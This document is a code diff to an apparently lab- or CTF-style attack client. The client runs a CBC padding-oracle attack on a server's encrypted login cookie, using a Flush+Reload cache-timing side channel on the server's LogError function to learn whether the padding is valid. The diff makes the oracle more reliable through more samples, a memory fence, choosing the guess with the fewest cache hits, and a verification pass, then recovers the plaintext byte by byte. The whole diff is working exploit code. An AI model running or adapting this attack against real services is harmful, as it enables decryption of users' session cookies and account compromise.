@@ -5,6 +5,7 @@
 #include <algorithm>
 #include <numeric>
 #include <cstdint>
+#include <climits>
 
 #include "./simple_networking.h"
 #include "./tinycrypt/tinycrypt.h"
@@ -154,24 +155,22 @@ void calibrate_threshold() {
   std::cout << "    Threshold:     " << g_cache_threshold << " cycles" << std::endl;
 }
 
-// Returns true if LogError was called (cache hit = invalid padding)
-bool was_log_error_called() {
-  uint64_t time = probe(g_log_error_addr);
-  return time < g_cache_threshold;
+// Probe and return timing
+uint64_t probe_timing() {
+  return probe(g_log_error_addr);
 }
 
 // Test if padding is valid using Flush+Reload
-// Returns true if padding is VALID (LogError NOT called)
-bool test_padding(simple_networking::TCPClient* client, const std::string& cookie) {
-  const int NUM_SAMPLES = 7;
-  int valid_count = 0;
+// Returns number of cache hits (LogError calls detected)
+int count_cache_hits(simple_networking::TCPClient* client, const std::string& cookie, int num_samples) {
+  int hit_count = 0;
 
-  for (int sample = 0; sample < NUM_SAMPLES; sample++) {
+  for (int sample = 0; sample < num_samples; sample++) {
     // Flush LogError from cache
     flush(g_log_error_addr);
 
-    // Small delay to ensure flush completes
-    for (volatile int i = 0; i < 100; i++) {}
+    // Memory barrier
+    asm volatile("mfence" ::: "memory");
 
     // Send login request with modified cookie
     client->SendMessage("login " + cookie);
@@ -179,14 +178,28 @@ bool test_padding(simple_networking::TCPClient* client, const std::string& cooki
     // Read response (ensures server processing is complete)
     client->ReadMessage();
 
-    // Check if LogError was called
-    if (!was_log_error_called()) {
-      valid_count++;
+    // Probe and check timing
+    uint64_t t = probe_timing();
+    if (t < g_cache_threshold) {
+      hit_count++;
     }
   }
 
-  // Padding is valid if LogError was NOT called in most samples
-  return valid_count > NUM_SAMPLES / 2;
+  return hit_count;
+}
+
+// Test if padding is valid using Flush+Reload
+// Returns true if padding is VALID (LogError NOT called)
+bool test_padding(simple_networking::TCPClient* client, const std::string& cookie) {
+  const int NUM_SAMPLES = 21;
+
+  int hit_count = count_cache_hits(client, cookie, NUM_SAMPLES);
+
+  // Padding is VALID if LogError was NOT called (few cache hits)
+  // Padding is INVALID if LogError was called (many cache hits)
+  // With invalid padding, server calls LogError, which loads it into cache
+  // We should see cache hits when padding is invalid
+  return hit_count < NUM_SAMPLES / 3;  // Valid if less than 1/3 hits
 }
 
 // ==========================================================================
@@ -240,52 +253,51 @@ void RunStoredCommands([[maybe_unused]] simple_networking::TCPClient* client) {
     uint8_t target_pad = 16 - pos;  // Padding value we want to achieve
 
     std::cout << "[*] Attacking byte " << pos << " (target padding: 0x"
-              << std::hex << (int)target_pad << std::dec << ")..." << std::endl;
+              << std::hex << (int)target_pad << std::dec << ")..." << std::flush;
 
     // Prepare modified ciphertext
     ByteVector modified = iv_ct;
 
     // Set bytes after current position to produce valid padding
     for (int j = pos + 1; j < 16; j++) {
-      // We want: intermediate[j] XOR modified_iv[j] = target_pad
-      // So: modified_iv[j] = intermediate[j] XOR target_pad
       modified[j] = static_cast<std::byte>(intermediate[j] ^ target_pad);
     }
 
-    bool found = false;
-    for (int guess = 0; guess < 256 && !found; guess++) {
-      // Modify IV byte at current position
-      // We want: intermediate[pos] XOR modified_iv[pos] = target_pad
-      // Try: modified_iv[pos] = guess
+    // Test all 256 values and find the one with minimum cache hits
+    int best_guess = -1;
+    int min_hits = INT_MAX;
+    const int SAMPLES_PER_GUESS = 5;
+
+    for (int guess = 0; guess < 256; guess++) {
       modified[pos] = static_cast<std::byte>(guess);
 
-      // Encode and create test cookie
       std::string mod_ct_b64 = base64::base64_encode(modified);
       std::string test_cookie = mod_ct_b64 + "." + hmac_b64;
 
-      // Test if padding is valid
-      if (test_padding(client, test_cookie)) {
-        // Valid padding found!
-        // intermediate[pos] = guess XOR target_pad
-        intermediate[pos] = guess ^ target_pad;
+      int hits = count_cache_hits(client, test_cookie, SAMPLES_PER_GUESS);
 
-        // Recover plaintext byte
-        // plaintext[pos] = intermediate[pos] XOR original_iv[pos]
-        uint8_t orig_iv = static_cast<uint8_t>(iv_ct[pos]);
-        recovered[pos] = intermediate[pos] ^ orig_iv;
-
-        char c = (char)recovered[pos];
-        std::cout << "[+] Byte " << pos << " = 0x" << std::hex << std::setw(2)
-                  << std::setfill('0') << (int)recovered[pos] << std::dec
-                  << " ('" << (isprint(c) ? c : '?') << "')" << std::endl;
-        found = true;
+      if (hits < min_hits) {
+        min_hits = hits;
+        best_guess = guess;
       }
     }
 
-    if (!found) {
-      std::cerr << "[-] Failed to recover byte " << pos << std::endl;
-      // Try to continue anyway
-    }
+    // Verify the best guess with more samples
+    modified[pos] = static_cast<std::byte>(best_guess);
+    std::string verify_ct_b64 = base64::base64_encode(modified);
+    std::string verify_cookie = verify_ct_b64 + "." + hmac_b64;
+    int verify_hits = count_cache_hits(client, verify_cookie, 15);
+
+    // Use the best guess
+    intermediate[pos] = best_guess ^ target_pad;
+    uint8_t orig_iv = static_cast<uint8_t>(iv_ct[pos]);
+    recovered[pos] = intermediate[pos] ^ orig_iv;
+
+    char c = (char)recovered[pos];
+    std::cout << " Found: 0x" << std::hex << std::setw(2)
+              << std::setfill('0') << (int)recovered[pos] << std::dec
+              << " ('" << (isprint(c) ? c : '?') << "') [hits=" << min_hits
+              << ", verify=" << verify_hits << "]" << std::endl;
   }
 
   // Reconstruct the plaintext
